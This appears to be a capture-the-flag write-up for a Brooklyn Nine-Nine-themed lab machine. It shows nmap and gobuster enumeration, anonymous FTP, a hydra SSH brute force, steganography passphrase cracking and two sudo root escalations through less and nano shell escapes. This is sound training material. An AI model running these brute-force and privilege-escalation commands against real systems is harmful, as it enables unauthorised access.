## Target IP: `10.10.18.175`

---

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O 10.10.18.175 -oN results.txt
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 7.6p1 |
| 80 | HTTP | Apache 2.4.29 |

---

### Web Enumeration

- Main page shows a picture from *Brooklyn Nine-Nine*
- Page source contains this comment:

```
<!-- Have you ever heard of steganography? -->
```

---

### Directory Brute Force

```bash
gobuster dir -u http://10.10.18.175 -w /usr/share/dirb/wordlists/common.txt
```

- No results found with small wordlist.
- No `robots.txt`.

---

### Download Image for Stego

```bash
wget http://10.10.18.175/brooklyn99.jpg
```

- Ran `steghide info brooklyn99.jpg`
- Image may contain embedded data, but stego cracking is postponed for now. (Unknown Passphrase)

---

### FTP Enumeration

```bash
ftp 10.10.18.175
```

- Logged in anonymously.
- Found file: `note_to_jake.txt`
- Downloaded with:

```bash
get note_to_jake.txt
```

**Contents:**

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

---

### SSH Brute Force

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.18.175
```

- Credentials found:
    - Username: `jake`
    - Password: `[REDACTED]`
- SSH access confirmed.

---

### User Enumeration

```bash
ls /home
```

- Found directories: `jake`, `holt`, `amy`
- Only `holt` has content:
    - `user.txt`
    - `nano.save`

```bash
cat user.txt
```

- Found hash: `ee11cbb19052e40b07aac0ca060c23ee`
- Used [CrackStation](https://crackstation.net/) → **Password: `[REDACTED]`**
- That hash is the user flag.

---

### Privilege Escalation (Method 1 – Jake)

```bash
sudo -l
```

- Output: Jake can run `less` as sudo.

**GTFOBins Method:**

```bash
sudo less /etc/profile
```

Inside less, enter:

```bash
!/bin/sh
```

- Gained root shell.
- Retrieved root flag from `/root`.

---

### Steganography Follow-Up

- Revisited image hint.
- Used [stegcracker](https://github.com/Paradoxis/StegCracker) with rockyou:

```bash
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

- Found passphrase: `[REDACTED]`

```bash
steghide extract -sf brooklyn99.jpg
```

- Extracted `note.txt`

**Contents:**

```
Holts Password:
[REDACTED]

Enjoy!!
```

---

### SSH as Holt + PrivEsc (Method 2 – Holt)

```bash
ssh holt@10.10.18.175
```

- Password: `[REDACTED]`

```bash
sudo -l
```

- Holt can run `nano` as sudo.

**Nano GTFOBins Root Method:**

```bash
sudo nano
```

Inside nano, press:

- `Ctrl+R`, then `Ctrl+X`

Then type:

```bash
reset; sh 1>&0 2>&0
```

- Gained root shell again via alternate method.
